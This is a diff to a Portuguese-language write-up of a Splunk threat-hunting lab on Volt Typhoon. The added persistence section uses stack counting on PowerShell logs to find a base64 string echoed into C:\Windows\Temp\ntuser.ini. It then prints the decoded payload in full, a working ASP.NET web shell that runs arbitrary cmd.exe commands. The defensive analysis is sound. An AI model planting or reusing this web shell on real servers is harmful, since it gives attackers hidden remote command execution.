@@ -51,7 +51,7 @@ A resposta da consulta mostrou esse evento com o usuário `voltyp-admin`, o usu�
 ![Execução](img/3.jpeg)
 
 WMIC, de forma simplificada, é como se fosse o painél de controle do Windows mas via linha de comando. É uma ferramenta nativa do Windows mas que foi descontinuada e só foi removida permanentemente no Windows 11, seu substituto passa a ser o PowerShell. 
-A questão diz que o grupo Volt Typhoon aproveitam o wmic ativo no sistema para realizar tarefas como coletar informações e despejar bancos de dados valiosos. A primeira pergunta quer saber o comando que o invasor executou para encontrar informações sobre unidades locais no `server01` e `server02`, vamos usar o nome desses servidores na consulta. 
+A tarefa diz que o grupo Volt Typhoon aproveitam o wmic ativo no sistema para realizar tarefas como coletar informações e despejar bancos de dados valiosos. A primeira pergunta quer saber o comando que o invasor executou para encontrar informações sobre unidades locais no `server01` e `server02`, vamos usar o nome desses servidores na consulta. 
 
 ![Execução](img/3-a.jpeg)
 
@@ -82,8 +82,70 @@ A resposta da consulta mostrou três eventos vindo da conta comprometida. Um del
 ### 4. Persistence
 
 ![Persistência](img/4.jpeg)
+
+A tarefa quatro diz que o Volt Typhoon frequentemente aplica web shells como mecanismo de persistência, e disfarçam elas como arquivos legitimos, permitindo o controle remoto sobre o servidor e executar os comandos sem ser detectado.
+A pergunta diz que o invasor criou uma web shell usando texto codificado em base64 (ofuscação), e quer saber em qual diretório o arquivo da web shell foi colocado. Vamos tentar usar essas informações ao nosso favor, para isso, preciso encontrar algum vestígio de base64 em algum evento.
+
+Consulta: `index="main" sourcetype="powershell" UserId="*dean-admin*" | stats count by CommandLine`
+
+Explicando a consulta: Estamos fazendo uma técnica chamada Stack Counting nos logs do PowerShell, essa técnica consiste em organizar por contagem alguma determinada informação (nesse caso comandos) para achar eventos raros e suspeitos. A consulta pega os logs do powershell que venha do usuário dean-admin (a conta comprometida), e organiza os comandos por contagem de ocorrências.
+
 ![Persistência](img/4-a.jpeg)
+
+A resposta da consulta mostram alguns comandos digitados pelo invasor, e um que chama a atenção e foi digitado uma única vez é o `echo`, esse comando serve para exibir valores, textos, etc. na tela (equivalente ao print() do Python), mas também é possível salvar e adicionar textos em arquivos com ele utilizando os operadores `>` ou `>>`. 
+Com essa informação em mãos, o próximo passo é investigar mais a fundo para que esse comando foi utilizado.
+
+Vou fazer uma nova consulta: `index="main" sourcetype="powershell" UserId="*dean-admin*" "*echo*"`
+
+Explicando a consulta: Estamos procurando nos logs do PowerShell um evento que venha do usuário dean-admin (a conta comprometida), e que tenha a palavra "echo".
+
 ![Persistência](img/4-b.jpeg)
+
+A resposta da consulta, como pode ser vista na imagem acima, mostra o evento em que houve a adição de algo codificado em Base64 em um arquivo que se encontra no caminho `C:\Windows\Temp\ntuser.ini`. A pergunta queria saber em qual diretório o web shell foi colocado, então precisamos decodificar o Base64 para saber se a resposta de fato é `C:\Windows\Temp\`.
+Copiando aquela string Base64 e usando um decodificador via terminal ou online, chegamos no seguinte código: 
+
+```
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = "cmd.exe";
+psi.Arguments = "/c "+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write("<pre>");
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write("</pre>");
+}
+</script>
+<HTML>
+<HEAD>
+<title>awen asp.net webshell</title>
+</HEAD>
+<body >
+<form id="cmd" method="post" runat="server">
+<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
+</form>
+</body>
+</HTML>
+```
+O código acima se trata de uma web shell em asp.net, que comprova a exatidão da resposta.
 
 ### 5. Defense Evasion
 
